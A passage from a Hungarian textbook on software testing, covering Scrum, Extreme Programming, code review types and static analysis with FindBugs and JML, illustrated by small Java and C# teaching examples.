Sprint Review Meeting (Futam áttekintés): Minden sprint végén összeülnek a szereplõk, és
megnézik, hogy melyek azok a sztorik, amelyeket sikerült elkészíteni, illetve az megfelel-e a
követelményeknek. Ekkor a sztori állapotát készre állítják. Fontos, hogy egy sztori csak akkor
kerülhet ebbe az állapotba, ha minden taszkja elkészült, és a Review-on elfogadták. Ezen a
megrendelõ is jelen van.
Sprint Retrospective (Visszatekintés): Ez az egyik legfontosabb meeting. A Scrum egyik
legfontosabb funkciója, hogy felszínre hozza azokat a problémákat, amelyek hátráltatják a
fejlesztõket a feladatmegoldásban, így ha ezeket az akadályokat megoldjuk, a csapat jobban
tud majd alkalmazkodni a következõ sprint alatt a feladathoz. Problémák a Daily Meetingen
is elõkerülnek, de ott inkább a személyeket érintõ kérdések vannak napirenden, míg itt a
csapatmunka továbbfejlesztése az elsõdleges.
Termékek
Product Backlog (termék teendõ lista): Ez az a dokumentum, ahol a Product Owner elhelyezi
azokat az elemeket, más néven sztorikat, amelyeket el kell készíteni. Ez egyfajta
kívánságlista. A Product Owner minden sztorihoz prioritást, fontossági sorrendet rendel, így 
2-19
tudja szabályozni, hogy melyeket kell elsõsorban elkészíteni, így a Sprint Planning során a
csapattagok láthatják, hogy ami a Backlog-ban legfelül van, azt szeretné a vevõ leghamarabb
készen látni, annak van a legnagyobb üzleti értéke. Emellett a csapatok súlyozzák az
elemeket aszerint, hogy melynek az elkészítéséhez kell a kevesebb munka, így azonos
prioritás mellett a kevesebb munkát igénylõ elemnek nagyobb a befektetés megtérülése
(Return of Investment, ROI). Az üzleti érték meghatározása a Product Owner, a munka
megbecslése a csapat feladata. A kettõ hányadosa a ROI.
Sprint Backlog (futam teendõ lista): Ebben a dokumentumban az aktuális sprintre bevállalt
munkák, storyk vannak felsorolva, ezeket kell adott idõn belül a csapatnak megvalósítania. A
sztorik tovább vannak bontva taszkokra, és ezeket a taszkokat vállalják el a tagok a Daily
Meeting során. Ez a feldarabolása a feladatoknak a feladat minél jobb megértését segíti.
Burn down chart (Napi Eredmény Kimutatás): Ez egy diagram, amely segít megmutatni, hogy
az ideális munkatempóhoz képest hogyan halad a csapat az aktuális sprinten belül. Könnyen
leolvasható róla, hogy a csapat éppen elakadt-e egy ponton, akár arra is lehet következtetni,
hogy ilyen iramban kész lesz-e minden a sprint végére. Vagy éppen ellenkezõleg, sikerült
felgyorsítani az iramot, és idõben, vagy akár kicsit hamarabb is kész lehet a bevállalt munka.
2.4.6 Extrém programozás
Az extrém programozás (angolul: Extreme Programming, vagy röviden: XP) egy agilis
módszertan. A nevében az extrém szó onnan jön, hogy az eddigi módszertanokból átveszi a
jól bevált technikákat és azokat nem csak jól, hanem extrém jól alkalmazza, minden mást
feleslegesnek tekint. Gyakran összekeverik a „programozzunk összeesésig” módszerrel,
amivel egy-két 24 órás vagy akár 48 órás programozó versenyen találkozhatunk.
Az extrém programozás 4 tevékenységet ír elõ. Ezek a következõk:
• Kódolás: A forráskód a projekt legfontosabb terméke, ezért a kódolásra kell a
hangsúlyt helyezni. Igazán kódolás közben jönnek ki a feladat nehézségei, hiába
gondoltuk azt át elõtte. A kód a legalkalmasabb a két programozó közötti
kommunikációra, mivel azt nem lehet kétféleképpen érteni. A kód alkalmas a
programozó gondolatainak kifejezésére.
• Tesztelés: Addig nem lehetünk benne biztosak, hogy egy funkció mûködik, amíg nem
teszteltük. Az extrém felfogás szerint kevés tesztelés kevés hibát talál, extrém sok
tesztelés megtalálja mind. A tesztelés játssza a dokumentáció szerepét. Nem
dokumentáljuk a metódusokat, hanem unit-teszteket fejlesztünk hozzá. Nem
készítünk követelmény specifikációt, hanem átvételi teszteseteket fejlesztünk a
megértett követelményekbõl.
• Odafigyelés: A fejlesztõknek oda kell figyelniük a megrendelõkre, meg kell érteniük az
igényeiket. El kell magyarázni nekik, hogy hogyan lehet technikailag kivitelezni ezeket
az igényeket, és ha egy igény kivitelezhetetlen, ezt meg kell értetni a megrendelõvel. 
2-20
• Tervezés: Tervezés nélkül nem lehet szoftvert fejleszteni, mert az ad- hoc megoldások
átláthatatlan struktúrához vezetnek. Mivel fel kell készülni az igények változására,
ezért úgy kell megtervezni a szoftvert, hogy egyes komponensei amennyire csak lehet
függetlenek legyenek a többitõl. Ezért érdemes pl. objektum orientált tervezési
alapelveket használni.
Néhány extrém programozásra jellemzõ technika:
• Páros programozás (pair programming): Két programozó ír egy kódot, pontosabban
az egyik írja, a másik figyeli. Ha hibát lát vagy nem érti, akkor azonnal szól. A két
programozó folyamatosan megbeszélik hogyan érdemes megoldani az adott
problémát.
• Teszt vezérelt fejlesztés (test driven development): Már a metódus elkészítése elõtt
megírjuk a hozzá tartozó unit-teszteket. Ezt néha hívják elõször a teszt (test-first)
megközelítésnek is.
• Forráskód átnézés (code review): Az elkészült nagyobb modulokat, pl. osztályokat,
egy vezetõ fejlesztõ átnézi, hogy van-e benne hiba, nem érthetõ, nem dokumentált
rész. A modul fejlesztõi elmagyarázzák mit és miért csináltak. A vezetõ fejlesztõ
elmondja, hogyan lehet ezt jobban, szebben csinálni.
• Folyamatos integráció (continuous integration): A nap (vagy a hét) végén, a
verziókövetõ rendszerbe bekerült kódokat integrációs teszt alá vetjük, hogy
kiderüljön, hogy azok képesek-e együttmûködni. Így nagyon korán kiszûrhetõ a
programozók közti félreértés.
• Kódszépítés (refactoring): A már letesztelt, mûködõ kódot lehet szépíteni, ami esetleg
lassú, rugalmatlan, vagy egyszerûen csak csúnya. A kódszépítés elõfeltétele, hogy
legyen sok unit-teszt. A szépítés során nem szabad megváltoztatni a kód
funkcionalitását, de a szerkezet, pl. egy metódus törzse, szabadon változtatható. A
szépítés után minden unit-tesztet le kell futtatni, nem csak a megváltozott kódhoz
tartozókat, hogy lássuk, a változások okoztak-e hibát. 
2-21
Az extrém programozás akkor mûködik jól, ha a megrendelõ biztosítani tud egy munkatársat,
aki átlátja a megrendelõ folyamatait, tudja, mire van szükség. Ha a változó, vagy a menet
közben kiderített követelmények miatt gyakran át kell írni már elkészült részeket, akkor az
extrém programozás nagyon rossz választás. Kezdõ programozók esetén az extrém
programozás nem alkalmazható, mert nincs elég tapasztalatuk az extrém módszerek
alkalmazásához.
Az extrém programozás legnagyobb erénye, hogy olyan fejlesztési módszereket hozott a
felszínre, amik magas minõséget biztosítanak. Ezek, mint pl. a páros programozás, nagyon
népszerûek lettek. 
2-22
Tartalomjegyzék
2 A tesztelés helye a szoftver életciklusában ........................................................ ............. 2-1
2.1 A szoftverkrízis .............................. ................................................... ......................... 2-1
2.2 A szoftver életciklusa ........................................................................... ..................... 2-1
2.3 Módszertanok .................................. ................................................... ...................... 2-3
2.4 V-modell....................................... ................................................... .......................... 2-3
2.4.1 Prototípus modell ........................... ................................................... ................ 2-5
2.4.2 Iteratív és inkrementális módszertanok.......................................................... .. 2-7
2.4.3 Gyors alkalmazásfejlesztés – RAD ............................................................... .... 2-10
2.4.4 Agilis szoftverfejlesztés ...................................................................... ............. 2-12
2.4.5 Scrum ....................................... ................................................... ..................... 2-14
2.4.6 Extrém programozás ............................................................................. .......... 2-19 
3-1
3 Statikus tesztelési technikák
A statikus tesztelési technikák a szoftver forrás kódját vizsgálják fordítási idõben. Ide tartozik a
dokumentáció felülvizsgálata is. A statikus tesztelés párja a dinamikus tesztelés, amely a szoftvert
futásidõben teszteli.
A statikus tesztelési technikáknak két fajtája van:
• felülvizsgálat és
• statikus elemzés.
A felülvizsgálat a kód, illetve a dokumentáció, vagy ezek együttes manuális átnézését jelenti. Ide
tartozik például a páros programozás. A statikus elemzés a kód, illetve a dokumentáció
automatikus vizsgálatát jelenti, ahol a statikus elemzést végzõ segédeszköz megvizsgálja a kódot
(illetve a dokumentációt), hogy bizonyos szabályoknak megfelel-e. Ide tartozik például a helyesírás
ellenõrzés.
A statikus technikával más típusú hibák találhatóak meg könnyen, mint a dinamikus tesztelési
technikákkal. Statikus technikákkal könnyen megtalálhatóak azok a kód sorok, ahol null
referencián keresztül akarunk metódust hívni. Ugyanezt elérni dinamikus teszteléssel nagyon
költséges, hiszen 100%-os kód lefedettség kell hozzá. Ugyanakkor dinamikus teszteléssel könnyen
észrevehetõ, hogy ha rossz képlet alapján számítjuk pl. az árengedményt. Ugyanezt statikusan
nehéz észrevenni, hacsak nincs egy szemfüles vezetõ programozónk, aki átlátja az üzleti oldalt is.
A statikus tesztelési technikák elõnye, hogy nagyon korán alkalmazhatóak, már akkor is, amikor
még nincs is futtatható verzió. Így hamarabb lehet velük hibákat találni és így gazdaságosabb a
hibajavítás.
3.1 Felülvizsgálat
A felülvizsgálat azt jelenti, hogy manuálisan átnézzük a forráskódot és fejben futtatjuk vagy
egyszerûen csak gyanús részeket keresünk benne. Ezzel szemben áll a statikus elemzés, ahol
szoftverekkel nézetjük át automatikusan a forráskódot. A felülvizsgálat fehérdobozos teszt, mivel
kell hozzá a forráskód. A felülvizsgálat lehet informális, pl. páros programozás, de akár nagyon
formális is, amikor a folyamatot jól dokumentáljuk, illetve a két szélsõség közti átmenetek.
Ezeket a hibákat könnyebb felülvizsgálattal megtalálni, mint más technikákkal:
• szabványoktól / kódolási szabályoktól való eltérések,
• követelményekkel kapcsolatos hibák, pl. nincs minden funkcionális követelményhez funkció,
• tervezési hibák, pl. az adatbázis nincs harmadik normál-formában,
• karbantarthatóság hiánya, pl. nincs biztonsági mentés és visszaállítás funkció,
• hibás interfész-specifikációk, pl. dokumentálatlan feltételezések. 
3-2
A felülvizsgálat legismertebb típusai:
• informális felülvizsgálat (csoporton belüli),
• átvizsgálás (házon belüli),
• technikai felülvizsgálat (külsõs szakérõ bevonásával rövid idejû),
• inspekció (külsõs szakérõ bevonásával hosszú idejû).
3.1.1 Informális felülvizsgálat
Sok szoftvercégnél elfogadott megoldás, hogy egy tapasztalt programozó átnézi (review) a kezdõk
kódját. A kezdõk a kritikából rengeteg tapasztalatot szerezhetnek. A kockázatosnak ítélt részeket
(pl. amire gyakran kerül a vezérlés, vagy kevésbé ismert megoldást alkalmaz) több tapasztalt
programozó is átnézheti. Ennek hatékonysága függ az átnézõk rátermettségétõl. Ez talán a
leginformálisabb megoldás.
Ehhez hasonló a páros programozás (pair programming) is. Ekkor két programozó ír egy kódot,
pontosabban az egyik írja, a másik figyeli. Ha a figyelõ hibát lát vagy nem érti a kódot, akkor
azonnal szól. A két programozó folyamatosan megbeszéli, hogy hogyan érdemes megoldani az
adott problémát.
A kódszépítés (refactoring) egy másik módja a felülvizsgálatnak. Ilyenkor a már letesztelt, mûködõ
kódot lehet szépíteni, ami esetleg lassú, rugalmatlan, vagy egyszerûen csak csúnya. A kódszépítés
elõfeltétele, hogy legyen sok unit-teszt. A szépítés során nem szabad megváltoztatni a kód
funkcionalitását, de a szerkezet, pl. egy metódus törzse, szabadon változtatható. A szépítés után
minden unit-tesztet le kell futtatni, nem csak a megváltozott kódhoz tartozókat, hogy lássuk, a
változások okoztak-e hibát. A kódszépítést a szerzõ és egy tapasztalt programozó végzi közösen.
Az informális felülvizsgálat legfõbb jellemzõi:
• informális, a fejlesztõ csapaton belüli felülvizsgálat,
• kezdeményezheti a szerzõ vagy egy tapasztaltabb fejlesztõ, ritkán a menedzsment,
• hatékonysága függ az átnézõ személyétõl, minél tapasztaltabb, annál több hibát vehet
észre,
• célja a korai költséghatékony hiba felderítés.
3.1.2 Átvizsgálás
Ez már kicsit formálisabb módja a felülvizsgálatnak. Általában a módszertan elõírja, hogy az
elkészült kisebb-nagyobb modulokat ismertetni kell a csapat többi tagjával, a többi csapattal. Célja,
hogy a mások is átlássák az általunk írt kódrészletet (ez csökkenti a kárt, amit egy programozó
elvesztése okozhat, lásd kockázat menedzsment), kritikai megjegyzéseikkel segítsék a kód
minõségének javítását. Aszerint, hogy hány embernek mutatjuk be az elkészült modult, ezekrõl
beszélhetünk: 
3-3
• váll feletti átnézés (over-the-shoulder review),
• forráskód átnézés (code review),
• kód átvétel (code acceptance review)
• körbeküldés (pass-around),
• csoportos átnézés (team review),
• felület átnézés (interface review),
• kód prezentálás (code presentation).
Váll feletti átnézés (over-the-shoulder review): Az egyik programozó egy ideje nézi saját
forráskódját, de nem találja a hibát. Valamelyik kollégáját megkéri, hogy segítsen. Mialatt
elmagyarázza a problémát, általában rá is jön a megoldásra. Ha mégsem, akkor a kollégának lehet
egy jó ötlete, hogy mi okozhatja a hibát. Általában ennyi elég is a hiba megtalálásához. Ha nem,
jöhet a forráskód átnézés.
Forráskód átnézés (code review): A kód írója megkér egy tapasztalt programozót, hogy segítsen
megtalálni egy nehezen megtalálható hibát. Együtt nyomkövetik a programot, miközben a szerzõ
magyarázza, mit miért csinált. Ellenõrzik, hogy a kód megfelel-e a specifikációnak. Ezt addig
fojtatják, amíg meg nem találják a hibát.
Kód átvétel (code acceptance review): Az elkészült nagyobb modulokat, pl. osztályokat, a vezetõ
fejlesztõ vagy egy tapasztalt programozó átnézi, hogy van-e benne hiba, nem érthetõ, nem
dokumentált rész. A modul fejlesztõi elmagyarázzák mit és miért csináltak. A vezetõ fejlesztõ
elmondja, hogyan lehet ezt jobban, szebben csinálni. Ha hibát talál (ez gyakran logikai hiba), akkor
arra rámutat, vázolja a javítást.
Körbeküldés (pass-around): A kód szerzõje körbeküldi az általa írt kódrészletet, ami akár egy egész
modul is lehet. A címzettek véleményezik a kódot, például megírják, melyik részét érdemes
tesztelni. A körbeküldés általában megelõzi a kód felvételét a verziókövetõ rendszerbe. Általában
csak akkor használják, ha egy kódrészlet kritikus fontosságú, pl. egy sokak által használt interfész.
Az intenzív kommunikációt elõíró módszertanokra (pl. Scrum) nem jellemzõ.
Csoportos átnézés (team review): A csoportos átnézés a körbeküldést helyettesíti. Itt is egy
érzékeny kódrészletet néznek át többen, de interaktívan. A kódot a szerzõ prezentálja, sorról sorra
magyarázza. Általában elvárás, hogy ha valaki valamit nem ért, azonnal szóljon. A prezentáció
végén a vezetõ programozó elmondja, szerinte mit lehetett volna jobban csinálni. Ehhez is gyakran
hozzászólnak a többiek. Több módszertan (pl. extrém programozás) limitálja ezen alkalmak
idõhosszát fél vagy egy órában.
Felület átnézés (interface review): Hasonló a csoportos átnézéshez, de itt általában több
embernek mutatjuk be azt az interfészt, amelyen keresztül a csoportunk fejlesztése lesz elérhetõ.
Ez azért fontos, hogy az egyes csoportok egyeztetni tudják elvárásaikat egymás felé. Ezeket rögzítik 
3-4
és az integrációs teszt során felhasználják.
Kód prezentálás (code presentation): Hasonló a csoportos átnézéshez, de az érdekes kódot nem a
csoporton belül, hanem a cégen belül mutatjuk be. Akkor gyakori, ha több telephelyen fejlesztik
ugyanazt a szoftvert. Nem feltétlenül az egész cég vesz részt benne, lehet, hogy csak három ember,
de könnyen elõfordulhat, hogy ezek más-más kontinensen vannak. A kód prezentálás célja lehet
egy hiba bemutatása, amit egy másik csapat talált és megkéri a kód tulajdonosát, hogy javítsa.
Másik gyakori cél a csúcs fejlesztõk összehozása, hogy a keretrendszer továbbfejlesztését
megbeszéljék.
Az átvizsgálás legfõbb jellemzõi:
• a moderátor maga a szerzõ, lehet jegyzõkönyvvezetõ is, de az nem a szerzõ,
• a résztvevõk a cég alkalmazottai, külsõ szakértõk nem jellemzõek,
• lehet informális és formális is, ha formális, akkor van pl. jegyzõkönyv,
• általában a módszertan írja elõ vagy a menedzsment kezdeményezi,
• a szerzõk jól felkészülnek, pl. szemléltetõ ábrákat készítenek, a többi résztvevõ átnézi a
kapcsolódó dokumentációt,
• célja az elkészült modulok ismertetése, megértések, azokban hibakeresés.
3.1.3 Technikai felülvizsgálat
Technikai felülvizsgálatra általában akkor kerül sor, ha a szoftver teljesítményével nem vagyunk
elégedettek. Azt általában könnyû megtalálni a felhasználói visszajelzések és úgynevezett profiler
programok segítségével, hogy mi az a szûk keresztmetszet (angolul: bottleneck), ami a lassúságot
okozza. Ugyanakkor az nagyon nehéz kérdés, hogyan oldjuk fel ezeket a szûk keresztmetszeteket.
Ha lenne egyszerû megoldás, akkor a programozók eleve azt használták volna, tehát ez általában a
szoftver cég alkalmazottainak tudását meghaladó probléma.
Ilyenkor külsõ szakértõket szoktak felkérni, hogy segítsenek. Leggyakrabban egy-egy lekérdezés
bizonyul túl lassúnak. Ilyenkor egy index hozzáadás a táblához nagyságrendekkel gyorsítja a
lekérdezést. A kérdés már csak az, mit indexeljünk és hogyan. A külsõs szakértõk átnézik a
megoldásunkat és javaslatokat adnak.
Mivel ez a fajta tanácsadás nagyon drága, ezért ez egy jól dokumentált folyamat. A szoftvercég
leírja, hogy mi a probléma. Mind a cég alkalmazottai, mind a szakértõk felkészülnek, átnézik a
dokumentációkat. A megbeszélést általában egy moderátor vezeti, aki jegyzõkönyvet is ír. A
moderátor nem lehet a program írója. A résztvevõk megbeszélik, hogy mi a probléma gyökere. A
szakértõk több megoldási javaslatot is adnak. Kiválasztanak egy megoldást. Ezt vagy a szerzõ, vagy
a szakértõk implementálják.
A technikai vizsgálat másik típusa, amikor külsõ szakértõk azt ellenõrzik, hogy a szoftver vagy a
dokumentációja megfelel-e az elõírt szabványoknak. Az ellenõrzést nem a megrendelõ, hanem a 
3-5
szoftver cég vagy a szabvány hitelesítését végzõ szervezet kezdeményezi. Pl. az emberi életre is
veszélyes (life-critical) rendszerek dokumentációjára az IEC61508 szabvány vonatkozik. Ennek
betartása a cég érdeke, mert ha kiderül, hogy nem tartja be a szabványt, akkor a termékeit akár ki
is vonhatják a piacról.
Akkor is ehhez a technikához fordulnak, ha a szoftverben van egy hiba, amit nagyon nehéz
reprodukálni, és a szoftver cég saját alkalmazottai nem tudják megtalálni (megtalálhatatlan hiba).
Ez többszálú vagy elosztott rendszereknél fordul általában elõ egy holtpont (deadlock) vagy
kiéheztetés (starvation) formájában, de lehet ez egy memóriaszivárgás (memory lake) is. Ilyenkor a
szakértõ megmutatja, hogyan kell azt a statikus elemzõ szoftvert használni, pl. egy holtpont
keresõt (deadlock checker), ami megtalálja a hibás részt. Az így feltárt hibát általában már a cég
szakemberei is javítani tudják.
A technikai felülvizsgálat legfõbb jellemzõi:
• a szoftver cég kezdeményezi, ha külsõ szakértõk bevonására van szüksége,
• moderátor vezeti (nem a szerzõ), jegyzõkönyvet vezet,
• inkább formális, mint informális,
• a találkozó elõtt a résztvevõk felkészülnek,
• opcionálisan ellenõrzõ lista használata, amit a felek elõre elfogadnak,
• célja a megtalálhatatlan hibák felderítése, vagy a szoftver lassúságát okozó szûk
keresztmetszetek megszüntetés, vagy szabványok ellenõrzése.
3.1.4 Inspekció
Ez a legformálisabb felülvizsgálat. Ezt is akkor használjuk, ha külsõ szakértõ bevonására van
szükségünk. A technikai felülvizsgálattól az különbözteti meg, hogy a szoftver cég és a szakértõt
adó cég részletesebb szerzõdést köt, amely magában foglalja:
• a megoldandó feladat leírását,
• azt a célfeltételt, ami a probléma megoldásával el kell érni,
• a célfeltételben használt metrikák leírását,
• az inspekciós jelentés formáját.
Míg a technikai átnézésnél gyakran csak annyit kérünk a szakértõktõl, hogy legyen sokkal gyorsabb
egy lekérdezés, az inspekció esetén leírjuk pontosan, hogy milyen gyors legyen.
Az inspekció szó abból jön, hogy a probléma megoldásához általában nem elég csak a szoftver egy
részét átvizsgálni, hanem az egész forráskódot adatbázissal együtt inspekció alá kell vonni.
Inspekciót alkalmazunk akkor is, ha egy régi (esetleg már nem támogatott programozási nyelven
íródott) kódot akarunk szépíteni / átírni, hogy ismét rugalmasan lehessen bõvíteni. 
3-6
Az inspektornak nagy tekintélyû szakembernek kell lennie, mert az általa javasolt változtatások
általában nagyon fájóak, nehezen kivitelezhetõek. Ha nincs meg a bizalom, hogy ezekkel a
változtatásokkal el lehet érni a célt, akkor a fejlesztõ csapat ellenállásán elbukhat a
kezdeményezés.
Az inspektort általában egy-két hónapig is a fejlesztõk rendelkezésére áll szemben a technikai
felülvizsgálattal, amikor a szakértõk gyorsan, akár néhány óra alatt megoldják a problémát. Ezért
ugyanannak a szakértõnek a napidíja általában kisebb inspekció esetén, mint technikai
felülvizsgálat esetén.
Az inspekció lehet rövid távú is (egy-két hetes), ha a szakértõre nincs szükség a probléma
megoldásához, csak a feltárásához. Ekkor a szakértõ egy inspekciós jelentést ír, amely leírja,
hogyan kell megoldani a problémát. Ehhez általában csatolni kell egy példa programot is, egy
úgynevezett PoC-kot (Proof of Concept), amely alapján a cég saját fejlesztõi is képesek megoldani
a problémát. A PoC-oknak demonstrálnia kell, hogy a kívánt metrika értékek elérhetõek a
segítségével.
Az inspekció legfõbb jellemzõi:
• a szoftvercég kezdeményezi, ha hosszabb távon van szüksége külsõ szakértõre,
• részletes szerzõdés szabályozza, ami a problémát, a célfeltételt és célban szereplõ
metrikákat is leírja,
• opcionálisan PoC-ok (Proof of Concept) készítése,
• inspekciós jelentés készítése,
• célja teljesítmény fokozás a szakértõ által kiválóan ismert technológia segítségével vagy
elavult kód frissítése.
3.2 Statikus elemzés
A statikus elemzés fehérdobozos teszt, hiszen szükséges hozzá a forráskód. Néhány esetben, pl.
holtpont ellenõrzés, elegendõ a lefordított köztes kód (byte kód). A statikus elemzés azért hasznos,
mert olyan hibákat fedez fel, amiket más tesztelési eljárással nehéz megtalálni. Például kiszûrhetõ
segítségével minden null referencia hivatkozás, ami az alkalmazás lefagyásához vezethet, ha benne
marad a programban. Az összes null referencia hivatkozás kiszûrése dinamikus technikákkal (pl.
komponens teszttel vagy rendszerteszttel) nagyon sok idõbe telne, mert 100%-os kódlefedettséget
kellene elérnünk.
A statikus elemzés azt használja ki, hogy az ilyen tipikus hibák leírhatók egyszerû szabályokkal,
amiket egy egyszerû kódelemzõ (parser) gyorsan tud elemezni. Például null referencia hivatkozás
akkor lehetséges, ha egy „a = null;” értékadó utasítás és egy „a.akármi;” hivatkozás közt van olyan
végrehajtási út, ahol az „a” referencia nem kap null-tól különbözõ értéket. Ugyan ezt lehet
dinamikus technikákkal is vizsgálni, de ahhoz annyi tesztesetet kell fejleszteni, ami minden
lehetséges végrehajtási utat tesztel az „a = null;” és az „a.akármi;” közt. 
3-7
A forráskód statikus elemzésnek két változata ismert, ezek:
• statikus elemzés csak a forráskód alapján,
• statikus elemzés a forráskód és modell alapján.
Ezen túl lehetséges a dokumentumok statikus elemzése is, de ezekre nem térünk ki.
A következõ hiba típusokat könnyebb statikus elemzéssel megtalálni, mint más technikákkal:
• null referenciára hivatkozás,
• tömbök túl vagy alul indexelése,
• nullával való osztás,
• lezáratlan adat folyam (unclosed stream),
• holtpontok (deadlock),
• kiéheztetés (starvation).
Az egyes eszközök lehetnek specifikusak, mint pl. a holtpont keresõk, illetve általánosak, mint pl. a
FindBugs.
3.2.1 Statikus elemzés csak a forráskód alapján
Azok az elemzõk, amelyek csak a forráskódot használják fel az elemzéshez, azok nagyon hasznosak
olyan szempontból, hogy nem igényelnek plusz erõfeszítést a programozóktól a specifikáció
megírásához. Ilyen eszköz például a FindBugs. Ezeket az eszközöket csak bele kell illeszteni a
fordítás folyamatába. Ezután a statikus elemzõ felhívja a figyelmünket a tipikus programozói
hibákra. Ezek általában programozási nyelv specifikusak, de léteznek nyelv függetlenek, pl. a Sonar
vagy a Yasca rendszer, amelyek egy-egy plugin segítségével adaptálhatóak a kedvenc nyelvünkhöz.
Jelen jegyzetben a FindBugs használatát fogjuk bemutatni Eclipse környezetben. Elõször telepíteni
kell a FindBugs plugint. Ehhez indítsuk el az Eclipse rendszert, majd válasszuk a Help -> Install New
Software… menüt. A megjelenõ ablakban adjuk hozzá a plugin források listájához az alábbi linket
az Add gombbal: http://findbugs.cs.umd.edu/eclipse. Ezután néhány Next gomb és a felhasználási
feltételek elfogadása után a rendszer elkezdi installálni a FindBugs plugint. Ez néhány percet vesz
igénybe, ami után újraindul az Eclipse. Ezután már használhatjuk a FindBugs-t.
A használatához válasszunk ki egy projektet, majd a helyi menüben válasszuk a Find Bugs -> Find
Bugs menüt. Ez egyrészt megkeresi azokat a sorokat, amelyek valamilyen szabálynak nem felelnek
meg, másrészt átvisz minket a FindBugs perspektívába. Ha talál hibákat, akkor ezeket bal oldalon
egy kicsi piros bogár ikonnal jelzi. Ha ezekre ráállunk vagy rákattintunk, akkor láthatjuk, milyen
típusú hibát találtunk. Ezekrõl részletes információt is kérhetünk, ha a FindBugs perspektíva Bug
Explorer ablakában kiválasztjuk valamelyiket.
Az egyes hibák ellenõrzését ki/be lehet kapcsolni a projekt Properties ablakának FindBugs panelén. 
3-8
Itt érdemes a Run atomatically opciót bekapcsolni. Így minden egyes mentésnél lefut a FindBugs.
Ebben az ablakban az is látható, melyik hiba ellenõrzése gyors, illetve melyik lassú. Például a null
referenciára hivatkozás ellenõrzése lassú.
Nézzünk néhány gyakori hibát, amit megtalál a FindBugs az alapbeállításaival:
public int fact(int n) { return n*fact(n-1); }
Itt a „There is an apparent infinite recursive loop” figyelmeztetést kapjuk nagyon helyesen, hiszen
itt egy rekurzív függvényt írtunk bázis feltétel nélkül, és így semmi se állítja meg a rekurziót.
Integer i = 1, j = 0;
if(i == j) System.out.println("ugyanaz");
Ebben a példában a „Suspicious comparison of Integer references” figyelmeztetést kapjuk. Ez azért
van, mert referenciák egyenlõségét ugyan tényleg a dupla egyenlõségjellel kell vizsgálni, de a
mögöttük lévõ tartalom egyenlõségét az equals metódussal kell megvizsgálni. Tehát ez egy
lehetséges hiba, amit érdemes a fejlesztõknek alaposan megnézni.
int i = 0;
i = i++;
System.out.println(i);
Itt több hibát is kapunk: „Overwritten increment” és „Self assignment of local variable”. Az elsõ
hiba arra utal, hogy hiába akartuk növelni az i változó értékét, az elvész. A második hiba azt fejezi
ki, hogy egy változót önmagával akarunk felülírni.
Nézzünk olyan esetet is, aminél hibásan ad figyelmeztetést a FindBugs:
public static void main(String[] args){
Object o = null;
int i = 1;
if(i == 1) o = "hello";
 System.out.println(o.toString());
}
A fenti esetre a „Possible null pointer dereference of o” hibát kapjuk, habár egyértelmûen látszik,
hogy az o értéket fog kapni, hiszen igaz az if utasítás feltétele. Ugyanakkor a FindBugs rendszer
nem képes kiszámolni a változók lehetséges értékeit az egyes ágakon, hiszen nem tartalmaz egy
automatikus tételbizonyítót. Ezzel szemben a következõ alfejezetben tárgyalt ESC/Java2 eszköz
képes erre, hiszen egy automatikus tételbizonyítóra épül.
3.2.2 Statikus elemzés a forráskód és modell alapján
Ebben az esetben a forráskód mellett van egy modellünk is, ami leírja, hogyan kellene mûködnie a
programnak. A program viselkedése ilyen esetben elõ- és utófeltételekkel, illetve invariánsokkal
van leírva. Ezt úgy érjük el legkönnyebben, hogy kontraktus alapú tervezést (design by contract)
használunk. Ez esetben minden metódusnak van egy kontraktusa, amely a metódus elõ- és
utófeltételében ölt testet. A szerzõdés kimondja, hogy ha a metódus hívása elõtt igaz az
elõfeltétele, akkor a metódus lefutása után igaznak kell lennie az utófeltételének. Az invariánsok
általában osztály szintûek, leírják az osztály lehetséges belsõ állapotait. A program viselkedését
legegyszerûbben assert utasításokkal írhatjuk le. 
3-9
Egy példa assert használatára:
public double division(double a, double b){
assert(b!=0.0);
return a / b;
}
A fenti példában azt feltételezzük, hogy a metódus második paramétere nem nulla. A program
kódjában a feltételezéseinket assert formájában tudjuk beírni Java esetén. Java esetén az assert
utasítások csak akkor futnak le, ha a JVM-et a –enableassert vagy az egyenértékû –ea opcióval
futtatjuk, egyébként nincs hatásuk.
C# esetén a fenti példa megfelelõje ez:
public double division(double a, double b)
{
System.Diagnostics.Debug.Assert(b != 0.0);
 return a / b;
}
Az Assert csak akkor fog lefutni, ha a Debug módban fordítjuk az alkalmazást.
A program viselkedését legegyszerûbben assert utasítások lehet leírni, de lehetõségünk van magas
szintû viselkedés leíró nyelvek használatára, mint például a JML (Java Modeling Language) nyelv.
Ez esetben magas szintû statikus kód ellenõrzést (Extended Static Checking, ESC) tudunk végezni az
ESC/Java2 program segítségével.
Egy példa JML használatára:
public class BankSzámla {
private /*@ spec_public @*/ int balansz = 0;
private /*@ spec_public @*/ boolean zárolt = false;
//@ public invariant balansz >= 0;
//@ requires 0 < összeg;
//@ assignable balansz;
//@ ensures balansz == \old(balansz) + összeg;
public void betesz(int összeg) { balansz += összeg; }
//@ requires 0 < összeg && összeg <= balansz;
//@ assignable balansz;
//@ ensures balansz == \old(balansz) - összeg;
public void kivesz(int összeg) { balansz -= összeg; }
//@ assignable zárolt;
//@ ensures zárolt == true;
public void zárol() { zárolt = true; }
//@ requires !zárolt;
//@ ensures \result == balansz;
//@ also
//@ requires zárolt;
//@ signals_only BankingException;
public /*@ pure @*/ int getBalansz() throws BankingException 
3-10
{
 if (!zárolt) { return balansz; }
 else { throw new BankingException("Zárolt a számla"); }
 }
}
Ebbõl a kis példából lehet látni, hogy a JML specifikációt megjegyzésbe kell írni, amely az @ jellel
kezdõdik. A spec_public kulcsszóval teszünk láthatóvá egy mezõt a JML specifikáció számára. Az
invariant kulcsszó után adjuk meg az osztály invariánsát, amelynek minden (nem helper) metódus
hívás elõtt és után igaznak kell lennie. Az elõfeltételt a requires kulcsszó után kell írni. Maga a
feltétel egy szabályos Java logikai kifejezés. A kifejezésben lehet használni JML predikátumokat is.
Az utófeltétel kulcsszava az ensures. Lehet látni, hogy az utófeltételben lehet hivatkozni a
visszatérési értékre a \result JML kifejezéssel. Az \old(x) JML kifejezés az x változó metódus futása
elõtti értékére hivatkozik. Az assignable kulcsszó segítségével úgynevezett keretfeltétel (frame
condition) adható, amiben felsorolhatom, hogy a metóduson belül mely mezõk értékét lehet
megváltoztatni. Ha egyik mezõ értékét sem változtathatja meg a metódus, akkor azt mondjuk,
hogy nincs mellékhatása. Az ilyen metódusokat a pure kulcsszóval jelöljük meg. Elõ- és
utófeltételben csak pure metódusok hívhatok. Az also kulcsszó esetszétválogatásra szolgál. A
